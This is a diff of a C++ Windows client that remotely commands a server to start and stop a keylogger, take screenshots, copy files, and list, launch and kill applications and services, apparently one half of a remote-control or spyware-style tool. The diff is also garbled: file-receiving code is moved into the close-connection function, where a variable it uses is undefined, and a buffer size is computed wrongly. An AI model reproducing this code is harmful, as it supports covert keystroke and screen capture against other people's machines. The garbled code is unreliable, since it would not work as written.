@@ -76,36 +76,25 @@ bool Client::sendRestartRequest() {
     return true;
 }
 
-bool  Client::sendKeyloggerRequest(){
-    const char* message = "keylogger";
+bool  Client::sendKeyloggerStartRequest(){
+    const char* message = "startKeylogger";
     int result = send(clientSocket, message, strlen(message), 0);
     if (result == SOCKET_ERROR) {
         std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
         return false;
     }
     
-    char buffer[1024];
-    std::ofstream outFile("keylogger_output.txt", std::ios::app);  // Open file in append mode
+    return true;
+}
 
-    if (!outFile) {
-        std::cerr << "Error: Unable to open file for writing.\n";
+bool Client::sendKeyloggerOffRequest(){
+    const char* message = "offKeylogger";
+    int result = send(clientSocket, message, strlen(message), 0);
+    if (result == SOCKET_ERROR) {
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
         return false;
     }
-    while(true){
-        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) {
-            // Write the received data to the file
-            std:: cout << std::string(buffer, 0, bytesReceived) << " ";
-            outFile << std::string(buffer, 0, bytesReceived) << " ";
-            outFile.flush();
-        }
-          if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
-            std::cout << "Exiting KeyLogger...\n";
-            break;
-        }
-        Sleep(10); 
-    }
-    outFile.close();
+    sendFileCopyRequest("log.txt", "copy_log.txt");
     return true;
 }
    
@@ -138,48 +127,6 @@ bool Client::sendScreenshotRequest()
     cv::Mat image = cv::imdecode(buffer, cv::IMREAD_COLOR);
     if (image.empty()) {
         std::cerr << "Failed to decode image data.\n";
-        return false;
-    }
-
-    cv::imwrite("received_screenshot.jpg", image);
-    std::cout << "Received screenshot from server and save as received_screenshot.jpg.\n";
-    return true;
-}
-
-#define NOMINMAX
-#undef min
-
-bool Client::sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName) {
-    std::string request = "copy_file|" + sourceFileName + "|" + destinationFileName;
-
-    // Send the request to the server
-    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR) {
-        std::cerr << "Failed to send file copy request: " << WSAGetLastError() << std::endl;
-        return false;
-    }
-
-    // Receive the initial response from the server (either file size or an error message)
-    char responseBuffer[256];
-    int bytesReceived = recv(clientSocket, responseBuffer, sizeof(responseBuffer) - 1, 0);
-    if (bytesReceived <= 0) {
-        std::cerr << "Failed to receive initial response from server: " << WSAGetLastError() << std::endl;
-        return false;
-    }
-    responseBuffer[bytesReceived] = '\0'; // Null-terminate the response
-
-    // Check if the response is an error message
-    std::string response(responseBuffer);
-    if (response.find("Failed") != std::string::npos) {
-        std::cerr << "Server error: " << response << std::endl;
-        return false;
-    }
-    std::cout << "Server message: " << response << std::endl;
-
-    // Receive the size of the file first
-    uint32_t fileSize;
-    bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-    if (bytesReceived <= 0) {
-        std::cerr << "Failed to receive file size: " << WSAGetLastError() << std::endl;
         return false;
     }
     
@@ -347,7 +294,84 @@ bool Client::sendCloseConnection()
         return false;
     }
 
-    std::cout << "Close connection request sent to server." << std::endl;
-    std::cout << "Connection closing..." << std::endl;
+    // Receive the size of the file first
+    uint32_t fileSize;
+    int bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
+    if (bytesReceived <= 0) {
+        std::cerr << "Failed to receive file size: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order
+
+    // Now receive the actual file data
+    std::vector<char> fileData(fileSize);
+    int totalBytesReceived = 0;
+
+    while (totalBytesReceived < static_cast<int>(fileSize)) {
+        std::size_t bytesToReceive = std::min(static_cast<std::size_t>(fileSize) - totalBytesReceived, sizeof(fileData));
+
+        bytesReceived = recv(clientSocket, fileData.data() + totalBytesReceived, bytesToReceive, 0);
+        if (bytesReceived <= 0) {
+            std::cerr << "Failed to receive file data: " << WSAGetLastError() << std::endl;
+            return false;
+        }
+        totalBytesReceived += bytesReceived;
+    }
+
+    // Save the received data to a file
+    std::ofstream outputFile(destinationFileName, std::ios::binary);
+    if (!outputFile) {
+        std::cerr << "Failed to create output file: " << destinationFileName << std::endl;
+        return false;
+    }
+    outputFile.write(fileData.data(), fileSize);
+    outputFile.close();
+
+    std::cout << "File copied and saved as: " << destinationFileName << std::endl;
     return true;
 }
+
+bool Client::sendListOfAppRequest(){
+    const char* message = "listApp";
+    int result = send(clientSocket, message, strlen(message), 0);
+    if (result == SOCKET_ERROR) {
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    sendFileCopyRequest("applications.txt", "copy_applications.txt");
+    return true;
+}
+
+bool Client::sendOpenAppRequest(const std::string& appName){
+    std::string message = "openApp|" + appName;
+    int result = send(clientSocket, message.c_str(), message.size(), 0);
+    if (result == SOCKET_ERROR){
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    return true;
+}
+
+bool Client::sendCloseAppRequest(const std::string& appName){
+    std::string message = "closeApp|" + appName;
+    int result = send(clientSocket, message.c_str(), message.size(), 0);
+    if (result == SOCKET_ERROR){
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    return true;
+}
+
+bool Client::sendListOfServiceRequest(){
+    const char* message = "listService";
+    int result = send(clientSocket, message, strlen(message), 0);
+    if (result == SOCKET_ERROR) {
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    sendFileCopyRequest("ListOfServices.txt", "copy_ListOfServices.txt");
+    return true;
+}
+
+
+
